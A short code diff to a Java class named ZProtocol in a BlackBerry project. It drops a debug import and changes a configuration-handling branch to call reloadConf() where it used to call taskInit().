@@ -32,7 +32,6 @@ import blackberry.evidence.EvidenceCollector;
 import blackberry.fs.AutoFile;
 import blackberry.fs.Directory;
 import blackberry.fs.Path;
-import blackberry.debug.Check;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
@@ -111,7 +110,7 @@ public class ZProtocol extends Protocol {
                         //#ifdef DEBUG
                         debug.trace("perform: conf is not corrupted, try it");
                         //#endif
-                        ret = Task.getInstance().taskInit();
+                        ret = Task.getInstance().reloadConf();
                     } else {
                         //#ifdef DEBUG
                         debug.trace("perform: conf was corrupted, or cannot write it");
